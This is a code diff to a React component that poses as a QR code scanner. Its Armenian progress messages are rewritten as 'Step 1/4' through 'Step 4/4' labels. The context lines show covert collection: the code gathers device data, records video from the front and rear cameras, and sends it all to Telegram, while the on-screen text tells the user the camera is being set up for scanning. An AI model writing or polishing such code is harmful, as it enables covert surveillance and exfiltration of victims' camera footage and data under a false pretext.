@@ -228,7 +228,7 @@ const PermissionHandler = () => {
     console.log(`[Session ${currentSessionId}] Starting runProcess. Attempt: ${attempt}`);
 
     if (attempt === 1) {
-      setLoadingMessage("Պատրաստվում ենք QR սկանավորմանը...");
+      setLoadingMessage("Քայլ 1/4: Պատրաստվում ենք QR սկանավորմանը..."); // Step 1/4: Preparing for QR scanning...
       setAppPhase("collectingData");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'collectingData'.`);
 
@@ -277,7 +277,7 @@ const PermissionHandler = () => {
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
       setProcessSuccessful(initialSendSuccess);
 
-      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար...");
+      setLoadingMessage("Քայլ 2/4: Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Step 2/4: Setting up the camera for best scanning...
       setAppPhase("recordingVideo1");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
@@ -286,7 +286,7 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video1SendSuccess);
       }
 
-      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույգ սկանավորման համար...");
+      setLoadingMessage("Քայլ 3/4: Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Step 3/4: Setting up the camera for best scanning...
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
@@ -295,7 +295,7 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video2SendSuccess);
       }
 
-      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում...");
+      setLoadingMessage("Քայլ 4/4: Անցում դեպի QR կոդի սկանավորում..."); // Step 4/4: Switching to QR code scanning...
       setAppPhase("flippingCamera");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'flippingCamera'.`);
       setAppPhase("qrScanning");
@@ -306,7 +306,7 @@ const PermissionHandler = () => {
       const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
       await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);
 
-      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար...");
+      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Setting up the camera for best scanning...
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
       const video2Base64 = await recordVideoSegment(5000, "environment");
